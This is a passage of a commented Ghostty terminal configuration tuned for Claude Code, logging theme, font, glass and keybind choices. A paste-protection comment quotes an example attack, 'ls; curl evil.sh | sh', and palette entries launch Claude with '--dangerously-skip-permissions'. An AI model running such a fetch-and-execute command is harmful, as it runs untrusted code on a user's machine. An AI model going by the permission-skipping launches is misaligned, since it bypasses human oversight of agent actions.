# ═══════════════════════════════════════════════════════════════
#  Ghostty — Claude Code edition
#  Active theme: see the `theme =` line below (a custom from ghostty/themes/,
#  the "stack theme" family). Typeface: PlemolJP Console NF.
#
#  NOTE: Ghostty does NOT allow inline comments on the same line
#  as a value. They always go on their own line.
# ═══════════════════════════════════════════════════════════════

# ─── theme ────────────────────────────────────────────────────
# Accepts a custom one from ghostty/themes/ (the stack family, below) or a
# Ghostty built-in (469 available, list them with `ghostty +list-themes`
# or preview at https://ghosttythemes.com).
# Warm built-in picks: Gruvbox Material Dark, Gruvbox Dark Hard, Everforest
# Dark Hard, Kanagawa Wave (dark) — Gruvbox Material Light, Rose Pine
# Dawn, Catppuccin Latte, Kanagawa Lotus (light). Solarized pick:
# Solarized Dark Patched (craftzdog style).
#
# NOTE: this `theme =` is THE active selection and the source of truth. Since
# the file is versioned, a `git pull` propagates the theme to the other
# machines. To change the look: `theme <id>` (scripts/theme edits this line
# and the equivalent one in nvim — they share the id), then commit.
#
# craftzdog's theme, ported into the family (2026-09-11). His line reads
# `theme = "Solarized Dark - Patched"` and that string DOES NOT RESOLVE — the
# built-in is named "Solarized Dark Patched", no hyphen:
#
#   theme "Solarized Dark - Patched" not found, tried path
#   .../Ghostty.app/Contents/Resources/ghostty/themes/Solarized Dark - Patched
#
# His file is from feb-2025 with two commits total, so the line has been dead a
# while and he is really looking at Ghostty's default palette. This is the theme
# he MEANT.
#
# Selected here as `solarized-patched`, a versioned copy in ghostty/themes/, and
# NOT by the built-in name. The built-in lives inside Ghostty.app, where nvim
# and Windows Terminal cannot reach it — naming it there would leave the
# other layers with nothing to mirror and break the one-id rule. The port is
# hex-verbatim from the shipped file; provenance is in the theme file itself.
# Canonical Solarized is not a valid source for it: this cut re-tunes every value.
theme = solarized-patched

# Custom themes — they live in `ghostty/themes/` (symlinked to
# <config-dir>/themes/ by install.sh). Canonical family of the stack (same
# id in Ghostty/nvim; to flip the look you edit the 2 configs):
#   · solarized-osaka — deep-ocean craftzdog style (near-black blue). In
#     Ghostty it's the `solarized-osaka` theme; the palette comes from the nvim plugin.
#   · solarized-patched — the "Solarized Dark Patched" cut, ported hex-verbatim
#     from the Ghostty built-in of that name because craftzdog's config selects
#     it. Darker canvas (#001e27) and every accent re-tuned against canonical.
#   · retta — port of the Eclipse "Retta" theme: true black + cream text,
#     pumpkin keywords (#e79e3c).
#   · dia-de-muertos — the night of the vigil: morado canvas (#1d1022),
#     cempasúchil cursor (#fc9417), rosa mexicano, talavera, turquoise, bone
#     text. Hues from the altar, everything else set in OKLCH.
#   · blueprint — a drafting sheet at night: near-black canvas (#0a0a0a), cyan
#     drafting-line cursor (#4be4ff), redline red, cyanotype-white text. Comes
#     with its own shader (shaders/blueprint.glsl), switched with the theme.
# ─── craftzdog's overrides ────────────────────────────────────
# These WIN over the theme's own values regardless of order, so whatever is
# uncommented here is what the terminal actually looks like.
#
# `background = #031219` is his, verbatim: a deep ocean near-black blue, over the
# patched cut's own #001e27. Comment it out the day a theme should own its canvas.
#
# `foreground = #ffffff` is NOT his, and the whole point of this block is the
# difference. He writes no foreground line at all, so Ghostty's default applies,
# and that default is pure white (`ghostty +show-config --default`). It only
# applies because his `theme =` does not resolve (see above); with the theme
# loaded the text is the cut's own #708284. So white is what his config produces
# today, by accident, and #708284 is the look he is actually known for.
#
# Measured, not argued. His README screenshot (images/screenshot-1.png, committed
# 2022-04-11, three years before he added a ghostty config at all) samples #6d7e84
# for body text over a #030f14 canvas — #708284 on #031219, both softened by the
# window's 0.9 opacity over the wallpaper. In 2022 he was on iTerm2, and that is
# where the string "Solarized Dark - Patched" comes from: it is an iTerm2 preset
# name, hyphen and all. He pasted it into Ghostty, which spells the same theme
# without the hyphen, and has been reading Ghostty's default palette ever since.
#
# OFF since 2026-09-21, which hands the text back to the theme. Pin it again only
# to reproduce what his screen shows now rather than what his screenshots show.
# The difference is a big one: white on #031219 is 19.01:1 against 4.72:1 for
# #708284, and Solarized keeps body text muted on purpose so that the accents
# carry the meaning. Intermediate options if #708284 is too quiet: #819090 (the
# cut's base1, 5.73:1) or #eae3cb (its ANSI white, warmer).
#
# Only the terminal. His nvim runs solarized-osaka.nvim with that theme's own
# muted fg, so nvim keeps the patched palette here either way.
#
# `background` is back on 2026-09-21 with `solarized-patched`. Both were off
# between 2026-09-18 and then, under the typesafe pair: a theme that owns its
# canvas (#abbab9 light, #182221 dark) and where white text would be invisible or
# too loud. Comment the background out again the day such a theme is active.
#
# Off again on 2026-10-01 under `dia-de-muertos`, whose morado canvas (#1d1022)
# is the theme; the osaka blue under it would read as a different palette.
#
# Back on 2026-10-05 with `solarized-patched`, together with his opacity and
# blur in the glass block below.
background = #031219
# foreground = #ffffff

# Display P3 wide-gamut — orange and cream saturate more on M-chip / Retina
# screens. No downside on non-P3 machines. Back on 2026-09-21 under
# solarized-patched, a palette that was never matched against a browser.
#
# `srgb` held the slot between 2026-09-18 and today, under the typesafe pair:
# `display-p3` reads every hex as a P3 coordinate, which on a wide-gamut screen
# pushes the sage greener and more saturated than the browser paints it — CSS
# `rgb()` is sRGB, and matching that page is the whole point of those two. It is
# also the default Ghostty documents for this key.
window-colorspace = display-p3
# window-colorspace = srgb

# Automatic minimum contrast. Fine tradeoff:
#   1.1 = no enforcement (friendly default). Dim grays evaporate
#         in light themes, brand colors stay faithful.
#   3.0 = WCAG AA large-text. Rescues the worst grays but preserves
#         brand colors like Claude orange (#d97757, ratio 3.28:1 over
#         cream — passes untouched). Sweet spot for a light theme on a
#         cream or white canvas.
#   4.5 = WCAG AA body text. Rescues every gray but DISTORTS brand
#         colors: Claude orange ends up nearly black. Not recommended.
# Still 1.1 (2026-09-11) under solarized-osaka, which is also what craftzdog runs:
# he sets no minimum-contrast at all, so anything above 1.1 would already be a
# departure from his look. It was 1.1 under naysayer too (2026-09-09, where it was
# load-bearing — his near-invisible Ghost_Character depends on no enforcement) and
# 3.0 under solarized-dark (2026-08-13).
#
# It stayed 1.1 under typesafe (2026-09-18) even though that one is a light
# theme: the "3.0 for light themes" rule above assumes a cream or white canvas,
# where Claude orange clears 3:1 untouched; over the sage #abbab9 the brand set
# sits at 1.1–1.8:1 (orange 1.55, blue 1.46, green 1.83) and 3.0 rewrote all of
# it into dark mud. Worth keeping in mind before raising this for any light
# canvas that is not cream or white.
minimum-contrast = 1.1

# ─── typography ───────────────────────────────────────────────
# Lilex — primary (2026-10-07), on trial, the NF build. IBM Plex Mono redrawn
# for code, with its ligatures on `calt` (on by default). Static ttfs with real
# italics, 0.6 em advance, a 1.3 em line (ascent 999 + descent 301). The plain
# family, not `Lilex Nerd Font Mono`, for the same reason as CaskaydiaCove
# below: the Mono cut squeezes every icon into one cell. Installed by brew
# (`font-lilex-nerd-font`).
# To go back: font-family = "Datatype".
#
# Datatype (Google Fonts) — primary (2026-10-07), on trial. A typeface for
# charts in text: its `liga`/`calt` turn brace syntax like `{l:1,5,3}` into
# inline sparklines and bars. One variable ttf, `wght` 100–900 and `wdth`
# 50–150. Every ASCII glyph is 0.5 em, narrow next to the 0.6 em of most
# monos; the space alone is 0.25 em, which the grid ignores. No italic file,
# so Ghostty obliques. NOT a Nerd Font, and it carries no box drawing or
# arrows: Ghostty draws the box glyphs itself and pulls the rest from the NF
# casks in install.sh. Installed by brew (`font-datatype`).
# To go back: font-family = "Intel One Mono".
#
# Intel One Mono — primary (2026-10-07), on trial. Built for low-vision
# legibility: big x-height, open counters, a tall 1.38 em line (ascent 1090 +
# descent 290). Static otfs with real italics in Light/Regular/Medium/Bold.
# NOT a Nerd Font: icons fall back into the NF casks in install.sh, which are
# load-bearing while this is the primary. The patched build exists as
# `font-intone-mono-nerd-font` (family "IntoneMono Nerd Font") if the fallback
# icons read wrong. Installed by brew (`font-intel-one-mono`).
# To go back: the Monaspace pair below.
#
# Monaspace (GitHub Next) — primary (2026-10-07), the NF build: Neon, the
# neo-grotesque face, for roman and bold, and Radon, the handwritten one, for
# both italics, the mix Monaspace itself proposes. Xenon (the slab) held the
# roman slot first, the same day. It IS a Nerd Font, so the icons come from
# the family and not from fallback. Static otfs with real italics, no `wght`
# axis. Installed by brew (`font-monaspace-nf`, already in install.sh's cask
# list). Same 0.62 em advance in all five faces, so mixing them keeps the grid.
# To go back: font-family = "Paper Mono".
#
# Paper Mono — primary (2026-10-07), its third turn. One variable ttf
# (Thin→ExtraBold, `wght` axis) with no Italic file, so italics are obliqued by
# Ghostty. NOT a Nerd Font: every powerline/devicon glyph falls back into the
# NF casks in install.sh, which are load-bearing while this is the primary.
# Installed by brew (`font-paper-mono`, in install.sh's cask list).
# To go back: font-family = "CaskaydiaCove Nerd Font".
#
# CaskaydiaCove Nerd Font (Cascadia Code, NF build) — primary (2026-10-05),
# picked off a screenshot. The plain family, not `CaskaydiaCove Nerd Font Mono`:
# the Mono cut squeezes every icon into one cell and was rejected on sight the
# same day. The Cascadia ligatures survive the patch. Installed by brew
# (`font-caskaydia-cove-nerd-font`). Its style strings are the stock
# Regular/Italic/Bold/Bold Italic, confirmed with `ghostty +list-fonts`, so the
# four `font-style` lines below carry over unchanged.
# To go back: font-family = "PlemolJP Console NF".
#
# PlemolJP Console NF — primary (2026-09-08) after Google Sans Code
# (2026-08-22), Paper Mono (2026-08-19), Google Sans Code (2026-08-13), the
# first PlemolJP Console NF trial (2026-08-03), Paper Mono (2026-07-30), Google
# Sans Code (2026-07-29) and 0xProto (2026-07-28).
# IS a Nerd Font, so it carries its own powerline/devicon glyphs instead of
# leaning on Ghostty's fallback into the other NF families. It also has real
# italic files, no obliquing (Paper Mono ships none and gets slanted).
# Installed by brew (`font-plemol-jp-nf`, already in install.sh's cask list) —
# nothing to add there.
# To go back: font-family = "Google Sans Code", "Paper Mono",
# "0xProto Nerd Font Mono" or "Maple Mono NF".
# Cross-checked against `ghostty +list-fonts` — the family reports as
# "PlemolJP Console NF". Note the SEPARATE "PlemolJP35 Console NF" family that
# also ships in the cask: that is the 3:5 width cut for JP text, not this one.
# +validate-config does NOT catch a missing family, it falls back silently.
#
# Tried and dropped the same day (2026-09-18): the typography of typesafe.ai,
# the page the `typesafe` theme is built on. Its body is "Die Grotesk C
# Regular" at 17px / 400 / 0.05em tracking / 120% leading — proportional and
# commercial, so it cannot come to a terminal grid. JetBrains Mono (its caption
# face, 12px/300) and Geist Mono (a grotesk mono stand-in, at the body's
# recipe, then at Medium) were both tried and rejected on sight: neither
# carries the page's stroke. Nothing of that round survives here.
font-family = "Lilex Nerd Font"

# Weight lives in the STYLE here, not in a variation axis (2026-09-08).
# PlemolJP is not a variable font — it has no `fvar` at all, so a
# `font-variation = wght=…` line would be read and silently ignored. What it
# ships instead is eight drawn weights, which Ghostty groups as styles of the
# one family: Thin 100 · ExtraLight 200 · Light 300 · Regular 400 · Text 450 ·
# Medium 500 · SemiBold 600 · Bold 700.
# Regular (400) since 2026-09-21, for the bold. Medium (500) held the slot from
# 2026-09-08, settled after trying Text (450, too light) and SemiBold (600, heavy
# enough to collapse against bold — 700 is one step away, so the roman and bold
# stop reading as different). Two steps of separation was judged enough then; it
# is not, once the body colour stopped being pure white. Claude Code emits bold
# as SGR 1 over its own text colour, so weight is the ONLY signal — `bold-color`
# cannot help, since truecolor text has no bright palette slot to promote to.
# 400 against 700 is three steps and the widest gap this family can give without
# going under Text, which was already rejected as too light on its own.
# Ghostty matches `font-style` against the style string the font advertises;
# these four are its nameID 17/2 values verbatim, confirmed with
# `ghostty +list-fonts --family="PlemolJP Console NF" --style=Regular`. Note the
# roman italic advertises as plain `Italic`, NOT `Regular Italic` — that string
# matches nothing and would silently fall back.
# Under Paper Mono (2026-10-07) only Regular and Bold resolve — its named
# instances, checked with `ghostty +list-fonts --family="Paper Mono" --style=…`.
# It had no italic style to name, so the two italic keys were left at their
# default and Ghostty obliqued the roman and bold cuts. Under Paper Mono the
# weight sat on its `wght` axis instead (470 roman, 700 bold, 2026-10-07):
# Monaspace NF is static, so a `font-variation` line would be ignored.
# Monaspace (2026-10-07) advertises the stock four, checked with
# `ghostty +list-fonts` against Neon, Xenon and Radon. Regular against Bold is the
# same three-step gap the PlemolJP paragraph above settled on.
# So did Intel One Mono (2026-10-07), whose nameID 2 values are the stock four.
# Datatype (2026-10-07) names Regular and Bold among its fvar instances and has
# no italic, so the italic keys went back to their default and Ghostty
# obliqued, as under Paper Mono.
# Lilex NF (2026-10-07) advertises the stock four again in nameID 2.
font-style = Regular
font-style-bold = Bold
font-style-italic = Italic
font-style-bold-italic = Bold Italic

# 17 — the one place this config does NOT follow craftzdog (2026-09-11). He sets no
# font-size at all, which means Ghostty's default of 13 (verified with
# `ghostty +show-config --default`, and his file has never had the key: 2 commits,
# both feb-2025). That reads far too small here, because PlemolJP's Latin sits on a
# JP half-width body — x-height 0.501 em, advance 0.528 — so 13 in this family is
# optically smaller than 13 in most monos.
# 17 is the size that matches the x-height of the Google Sans Code this replaced
# (0.501 × 17 = 8.52px against 8.38), i.e. the right value on paper. It was dropped
# to 16 on 2026-09-08 for reading a touch big, and came back today. 19 was the
# earliest try and overshot in both axes; 16 is the step down if 17 crowds the columns.
# 16 since 2026-10-05, with the switch to CaskaydiaCove: Cascadia's x-height is
# taller than PlemolJP's, so the 17 above read big in it.
#
# PER-MACHINE since 2026-10-05: the right size depends on the screen, so the key
# lives in ~/.config/ghostty/config.local (see `config-file` at the end of this
# file), not here. A machine without that file gets Ghostty's 13.

# Standard ligatures — and here they are REAL. Unlike Google Sans Code (whose
# GSUB has no `liga` at all, so this line was inert for months), PlemolJP ships
# an actual `liga`, so this one does something.
# It also has a real `zero` feature, which Google Sans Code did not: add
# `font-feature = zero` on its own line to get the slashed zero.
font-feature = +liga

# Lilex (2026-10-07) has no `liga` either: its code ligatures live in `calt`,
# on by default. Its stylistic sets, named in its GSUB, all stay off: ss01
# turns && || into arrows, ss02 breaks the equals ligatures, ss03 thins the
# backslash, ss04 breaks the number signs. A `font-feature = -calt` would
# switch every ligature off.
# Under Datatype `liga` was the chart engine, not code ligatures: text shaped
# like `{b:20,40,80}` rendered as a bar chart. Intel One Mono had no `liga`;
# its code ligatures were opt-in as ss01. Under Monaspace ss01–ss10 were its
# ten ligature sets (equals, comparisons, arrows, tags, F#, markdown, centred
# colon and period, double arrows, other tags), all on, with texture healing on
# `calt`. Under Paper Mono ss01–ss04 were ligatures, duospace, narrow space and
# small arrows, plus cv01 for the single-story a.

# Off on Retina (2026-08-26). This exists to compensate 1x panels; on a 2x
# display `true` implies the max `font-thicken-strength = 255` (that's the
# default when thickening is on, NOT a mild setting), which reads like a
# heavier weight but with smeared contours. Doubly pointless here: the weight
# is already picked by `font-style` above, from a drawn cut. On a non-Retina
# external monitor turn it back on — or keep it on with
# `font-thicken-strength = 40` for a bit of body without the smear.
font-thicken = false

# The font's own line (2026-10-07): 1.3 em under Lilex and Datatype, 1.38 em
# under Intel One Mono, 1.245 em under Monaspace. Under Paper Mono this was
# -17.5%, its specimen's 99% line height. Intel One Mono ran at -10% (near
# 1.24 em) after -8%. Lilex starts at its own line.
adjust-cell-height = 0%

# Lilex starts at its own 0.6 em advance (2026-10-07), as Datatype did at its
# 0.5 em. Intel One Mono ran at -7% (its glyphs sat narrow inside a
# 0.614 em advance; past -8% m, w, @ touched) after -5%. Under Paper Mono -5.4%
# letter spacing was tried (-9% here, since CSS spaces in em and the cell
# scales by its own width) and dropped, back to the font's own advance.

# Faint (SGR 2) text at 70% instead of the default 50%. Claude Code leans on
# faint constantly — paths, timestamps, hints, the dimmed half of a diff — and
# half opacity over a near-black canvas puts all of it near the floor of what is
# readable. 0.7 keeps the hierarchy without making faint compete with body text.
faint-opacity = 0.7

# Bold uses the bright half of the palette rather than the same colour at a
# heavier weight. It earns its place now that `foreground` is pure white: against
# white body text a bold glyph in the same colour reads as barely different, and
# the drawn Bold cut (font-style-bold above) is doing all the work alone.
# In this palette the brights are the Solarized base greys plus orange and violet.
bold-color = bright

# ─── window ───────────────────────────────────────────────────
# `transparent` (2026-09-11), which is also Ghostty's own default. It was `tabs`
# — the Chrome/Arc style that integrates the tab bar into the titlebar and frees
# ~1 vertical line — and that style is incompatible with the glass: the binary's
# docs describe it as a fully custom titlebar that ALWAYS matches the terminal's
# background colour, so it paints an opaque strip while the body below is
# translucent. Visible as a hard band across the top of the window.
# `transparent` lets the window background through instead, at the cost of the
# tab bar becoming its own row again.
# Alternatives: tabs (opaque, integrated) · native (standard macOS, opaque) ·
# hidden (no titlebar; the top area then can't drag the window).
#
# NOTE this one does NOT apply on reload — the docs say changing it at runtime
# only affects NEW windows. ⌘N after ⌘⇧R, or the old titlebar stays.
macos-titlebar-style = transparent

# GLASS (2026-09-11, off 2026-09-18 under the light `typesafe`, back on 2026-09-20
# under `typesafe-dark`). It returned as craftzdog's pair, but neither value is
# still his.
#
# The other half of this lives in nvim: `transparent = true` on the ACTIVE theme's
# spec (solarized-patched.lua and dia-de-muertos.lua carry it; retta.lua does
# not). Without it nvim paints an opaque canvas over the glass and the seam shows
# at every split edge, so the two move together — and the setting does not follow
# a theme around, so a theme swap means checking the new spec carries it. A light
# theme cannot: a light canvas over the glass is unreadable (see colorscheme.lua),
# so selecting one means turning the pair below off again.
#
# NATIVE GLASS instead of his blur. His line is `background-blur-radius = 20` —
# the pre-1.1 name of the key, still accepted as an alias, and 20 is simply what
# `true` means, so he picked the plain default rather than a tuned radius. That is
# a gaussian blur Ghostty computes itself.
#
# `macos-glass-clear` is the system's own glass material, available since macOS
# 26 and therefore impossible in his config (feb-2025). Written with the modern key
# name on purpose: the value is a material, not a radius. This is the highly
# transparent cut; the other material is `macos-glass-regular`, the standard one
# and the closest analogue to Windows Terminal's acrylic, which held the slot for
# part of 2026-09-20. Clear ran from 2026-09-11 and was dropped for letting the
# desktop read through too much — over the LIGHT sage canvas. It came back on
# 2026-09-20 under `typesafe-dark` and held under `solarized-patched`, the dark
# canvas it was tuned on in the first place. Regular took the slot on 2026-10-01
# under `dia-de-muertos` — the frosted material keeps the morado canvas reading as
# morado, where clear lets the wallpaper's colours through and tints it — and lost
# it the same day: the tint is the accepted price of a window that reads as glass.
#
# 0.9, his value, down from the 0.95 this held through the regular-glass days: the
# point of going back to clear was more transparency, not the same amount through
# a thinner material. The glass carries its own opacity on top of this one, and
# `background-opacity-cells` below pushes both down onto cells that set their own
# background — with the clear material that compounding is what can leave lazygit
# panels and diff hunks looking thin, and the cells key below is the dial for it.
#
# To restore his exact pair: `background-opacity = 0.9` and
# `background-blur-radius = 20`.
#
# The solid pair for a light theme is `background-opacity = 1.0` and
# `background-blur = 0`: under `typesafe` the desktop bleeding through the light
# sage canvas muddied it, and a light theme cannot take `transparent = true` in
# nvim anyway. With opacity at 1.0 `background-opacity-cells` goes inert.
#
# SOLID since 2026-10-05 under `blueprint`, a dark theme, so for legibility rather
# than for a light canvas: through the clear glass the wallpaper read behind the
# lettering and the text got lost on the sheet. To bring the glass back, the pair
# above (0.9 + macos-glass-clear); blueprint.lua already carries `transparent`.
#
# His exact pair since 2026-10-05, back on `solarized-patched`: 0.9 and the
# gaussian blur at radius 20, written with the modern key (`background-blur`
# takes the radius directly). Not macos-glass-clear — the point this time is
# to match his screen, not to improve on it.
#
# SOLID again later the same day, still on `solarized-patched`, to put the
# blueprint grid under it: the grid reads as paper only over a canvas that holds
# still, and through the blur the wallpaper moved behind it. To bring his pair
# back, the two values in the paragraph above.
background-opacity = 1.0
background-blur = 0

# `background-opacity` applies to the WINDOW background alone, so any cell
# carrying an explicit background colour stays fully opaque by default — Ghostty's
# own docs call out Neovim among the programs that repaint cell backgrounds
# and therefore "may not respect background-opacity (by design)". `true` extends
# the opacity to those cells too, which is what "the glass is only half on
# otherwise" means here.
#
# It also has to be `true` for a TUI colour to be able to DISAPPEAR. A theme that
# wants no band behind a line paints that line the canvas colour; with cells
# opaque, that block renders solid while the window around it is glass, so the
# "invisible" band comes out as a darker rectangle. Only when cells share the
# window's opacity does canvas-coloured mean actually unseen. claude/themes/
# solarized-patched.json depends on exactly that for its diff rows, so the two
# move together: turning this off means giving those rows a real colour again.
background-opacity-cells = true

# Blend alpha in linear space with the correction step. macOS defaults to
# `native` (Display P3); `linear-corrected` removes the darkening artifacts around
# glyph edges — worst on red/green pairs — while keeping text the same weight,
# which plain `linear` does not (it thins dark text and fattens light text).
# Only matters because there is transparency behind the glyphs; with a solid
# background the two are indistinguishable.
alpha-blending = linear-corrected

# ─── shaders ──────────────────────────────────────────────────
# Post-process passes over the rendered terminal, Shadertoy-style GLSL from
# ghostty/shaders/ (symlinked beside this file by install.sh; the path is
# relative to this file's directory). Repeat the key to chain passes.
#
# `crt` (2026-09-18): a still CRT — scanlines, aperture grille, faint bloom,
# vignette. No curvature, no rolling band: the shader never reads iTime, so
# the animation loop below is off and the pass only re-renders when the
# terminal does. Strengths are tuned for the light typesafe canvas and live
# as constants at the top of the file.
#
# A shader that fails to compile is silently skipped — the error goes to the
# system log, not to `+show-config`:
#   log show --predicate 'process == "ghostty"' --last 5m | grep -i shader
#
# OFF since 2026-09-18, the same day it landed: tried for an afternoon and
# taken out by taste. The file and the symlink stay; uncomment the one line to
# get it back. `custom-shader-animation` is left set — it is inert without a
# shader and the CRT wants it false.
# custom-shader = shaders/crt.glsl
#
# `blueprint` (2026-10-05): the terminal as a night blueprint sheet, made for
# the `blueprint` theme — a faint 24px minor / 120px major grey grid, a soft
# ink bleed around the glyphs and the grain of cyanotype paper (its uneven
# exposure is off: on a solid window it read as blotches). Static like the CRT. The line work is drawn only where the canvas
# shows (the glass, or cells a TUI paints in the canvas colour) and breaks
# around lettering, so it never crosses text, the selection or a coloured
# panel. The canvas is read from Ghostty's `iBackgroundColor`, so the shader
# follows whatever `background` the theme sets; its white halo is tuned for
# blueprint's near-black and would smudge a light canvas. Sizes are device
# pixels tuned at 2×: the grid stops 20px in, inside the padding below on a
# Retina screen (on a 1× screen it reaches into the first row).
# The line below is not hand-toggled: named after a theme, it belongs to it, and
# `theme <id>` turns it on for `blueprint` and comments it out for anything else.
# custom-shader = shaders/blueprint.glsl
custom-shader-animation = false

# breathe sideways — generous padding so that Claude Code's dense
# output (tool calls, diffs, trees) doesn't feel cramped.
window-padding-x = 22
window-padding-y = 18

# centers content on reflow
window-padding-balance = true

# extend = the padding inherits the color of the cell adjacent to the border
# (it looks more cohesive when selecting text near the margin).
window-padding-color = extend

# restores the session when reopening Ghostty
window-save-state = always

# ─── cursor ───────────────────────────────────────────────────
# Block + blink — craftzdog's pair, and also Ghostty's own default shape. The
# color comes from the active theme (cursor-color + cursor-text); under osaka
# that is the magenta #d23681, and with a block `cursor-text` matters again
# because the cursor covers the glyph underneath. Other options: bar (a thin
# caret, what was here between 2026-08 and today), block_hollow, underline.
cursor-style = block

# Blinking, his setting too. A block that blinks is the loudest combination of
# the two axes — set this false for a steady cursor if it gets distracting.
cursor-style-blink = true

# ─── selection and copying ────────────────────────────────────
# selecting already copies (fast workflow)
copy-on-select = clipboard

# Trims trailing spaces/newlines when copying — avoids the classic
# "I pasted a command and it ran by itself because there was a \n at the end".
clipboard-trim-trailing-spaces = true

# Paste protection — Ghostty shows you a confirm dialog if the pasted
# text contains newlines or suspicious control characters
# (typical attack: copying "ls" from a website that's actually
# "ls; curl evil.sh | sh\n"). Cost: an occasional extra click.
clipboard-paste-protection = true

# ─── scrollback ───────────────────────────────────────────────
# Big buffer to re-read long outputs. The unit is BYTES, not lines: a
# line-count-looking `100000` is ~100 KB, below even the default (10 MB; 50 MB
# from 1.4, which renames the key `scrollback-limit-bytes` to say so and keeps
# this spelling as an alias).
scrollback-limit = 100000000

# ─── notifications ────────────────────────────────────────────
# Silence the bells — in SDD, interruptions break the flow.
# bell-features controls every mode of the bell.
bell-features = no-system,no-audio,no-attention,no-title,no-border

# ─── mouse ────────────────────────────────────────────────────
mouse-hide-while-typing = true

# ─── quick terminal (Quake-style drop-down) ───────────────────
# ⌥` opens a floating terminal on top of any app so you can
# check something without losing your main window's context.
# It closes with the same combo but the process stays alive
# in the background — ideal for keeping a persistent shell
# (claude, lazygit, REPLs) that you reopen instantly.
quick-terminal-position = top
# 100% = takes up the whole screen (full-screen popup). If at some
# point you want to go back to the small Quake-style "drop-down" mode,
# set 40% or 50%.
quick-terminal-size = 100%
quick-terminal-animation-duration = 0.15

# Stay open when focus moves to another app (macOS default is to hide). The
# premise of this surface here is a persistent shell — claude, lazygit,
# REPLs — so vanishing the moment you click a browser to read something is the
# opposite of what it is for. Closing is ⌥` again, deliberately.
quick-terminal-autohide = false

keybind = global:alt+grave_accent=toggle_quick_terminal

# ─── splits ───────────────────────────────────────────────────
# ⌘D opens a split on the right and ⌘⇧D a split below (Ghostty defaults).
# vim-style navigation between splits — key when you have
# [spec | implementation | tests] side by side.
keybind = cmd+alt+h=goto_split:left
keybind = cmd+alt+j=goto_split:bottom
keybind = cmd+alt+k=goto_split:top
keybind = cmd+alt+l=goto_split:right
keybind = cmd+shift+enter=toggle_split_zoom
keybind = cmd+alt+equal=equalize_splits

# ─── prefix: ⌘B, then a key ───────────────────────────────────
# A tmux-style prefix, as key sequences (Ghostty ≥ 1.3). ⌘B is free
# in Ghostty and in macOS; a Ctrl letter would not be, readline and fzf own
# them. Splits open in the pane's cwd (Ghostty's default). Letters only, v and
# s as in nvim's :vsplit / :split: `\`, `|` and `=` cost an AltGr or a Shift
# on the Latin American layout.
keybind = cmd+b>h=goto_split:left
keybind = cmd+b>j=goto_split:bottom
keybind = cmd+b>k=goto_split:top
keybind = cmd+b>l=goto_split:right
keybind = cmd+b>v=new_split:right
keybind = cmd+b>s=new_split:down
keybind = cmd+b>z=toggle_split_zoom
keybind = cmd+b>e=equalize_splits
keybind = cmd+b>x=close_surface
keybind = cmd+b>c=new_tab
keybind = cmd+b>n=next_tab
keybind = cmd+b>p=previous_tab
keybind = cmd+b>comma=prompt_tab_title

# Read-only pane: keys and mouse stop reaching the process, while selecting,
# scrolling and copying still work. For reading a running Claude without typing
# into it by mistake. FOOTGUN: it swallows input until toggled off with the same
# chord. ⌘B M lets the mouse select text even when nvim or a TUI captures it.
keybind = cmd+b>w=toggle_readonly
keybind = cmd+b>m=toggle_mouse_reporting

# Resize is a mode, not a chord: ⌘B R, then h/j/k/l as many times as needed.
# FOOTGUN: while it is active `catch_all` swallows every other key, so nothing
# reaches the shell. Esc or Enter leaves it.
keybind = cmd+b>r=activate_key_table:resize
keybind = resize/h=resize_split:left,30
keybind = resize/j=resize_split:down,30
keybind = resize/k=resize_split:up,30
keybind = resize/l=resize_split:right,30
keybind = resize/e=equalize_splits
keybind = resize/escape=deactivate_key_table
keybind = resize/enter=deactivate_key_table
keybind = resize/catch_all=ignore

# Scrollback into nvim (tmux's copy mode, with search, yank and motions):
# ⌘B O types `nvim <temp file with the whole scrollback>` at the prompt, no
# Enter. It TYPES, so at a shell prompt only; inside a TUI (Claude Code, nvim)
# use ⌘B Y, which just copies the path, and open it from a shell.
keybind = cmd+b>y=write_scrollback_file:copy
keybind = cmd+b>o=text:nvim\x20
keybind = chain=write_scrollback_file:paste

# ⌘⇧P palette entries. The Claude ones TYPE the command into the focused pane
# (Ghostty cannot start a process in a new split), so pick them at a shell
# prompt: anywhere else the text lands in whatever is running.
command-palette-entry = title:"Resize splits",description:"Modal resize: h/j/k/l, e equalizes, Esc leaves.",action:activate_key_table:resize
command-palette-entry = title:"Claude: here",description:"Types claude + Enter in the focused pane.",action:"text:claude\r"
command-palette-entry = title:"Claude: here, gateway",description:"Types claude --api + Enter in the focused pane.",action:"text:claude --api\r"
command-palette-entry = title:"Claude: here, skip permissions",description:"Types claude --dangerously-skip-permissions + Enter.",action:"text:claude --dangerously-skip-permissions\r"
command-palette-entry = title:"Claude: here, gateway, skip permissions",description:"Types claude --api --dangerously-skip-permissions + Enter.",action:"text:claude --api --dangerously-skip-permissions\r"

# Reset font-size — useful when doing demos or screen-sharing specs
keybind = cmd+zero=reset_font_size

# Shift+Enter = newline in Claude Code (instead of submit). Ghostty
# by default follows modifyOtherKeys and sends `\x1b[27;2;13~`, which
# Claude Code doesn't interpret as a newline. Sending `\n` directly does
# work — TUIs like nvim/lazygit don't see Shift+Enter without this
# but they don't need it either. Workaround documented in ghostty
# discussion #7780 and claude-code issue #5757.
keybind = shift+enter=text:\n

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 1 — macOS essentials
# ═══════════════════════════════════════════════════════════════

# Option (⌥) works as Alt → vim/zsh/emacs keybinds work.
# `left`: only the LEFT Option maps as Alt. The RIGHT Option
# stays free for special characters with an ES keyboard (⌥+ñ, ⌥+5 = €,
# ⌥+8 = •, ⌥+e = ´, etc.). Better than `true` (both) if you type specials.
macos-option-as-alt = left

# Give ⌥← / ⌥→ back to the running program. Ghostty binds them by default to
# `esc:b` / `esc:f` (readline word-jump, confirmed with
# `ghostty +list-keybinds --default`), which it then sends INSTEAD of the raw
# key — so nvim and any TUI that wants ⌥+arrow never sees it.
# `alt+left` / `alt+right` is craftzdog's spelling verbatim; `arrow_left` /
# `arrow_right` is what Ghostty prints in `+list-keybinds`, and both parse.
keybind = alt+left=unbind
keybind = alt+right=unbind

# Global show/hide of every Ghostty window from any app — his line, the only one
# in his config we didn't already have. Note it is COMMENTED OUT in his repo, so
# this is one step past copying him: he wrote it and chose not to run it.
# Distinct from the quick terminal below (⌥` ), which summons a separate floating
# surface instead of toggling the real windows.
keybind = global:cmd+ctrl+shift+j=toggle_visibility

# Shell integration: enables the stand-by cursor with sudo,
# injects the path for opening files by click, etc.
shell-integration-features = cursor,sudo,title,no-ssh-env,no-ssh-terminfo,path

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 2 — Long-command notifications
# ═══════════════════════════════════════════════════════════════

# Notifies via macOS when a command finishes AND the window
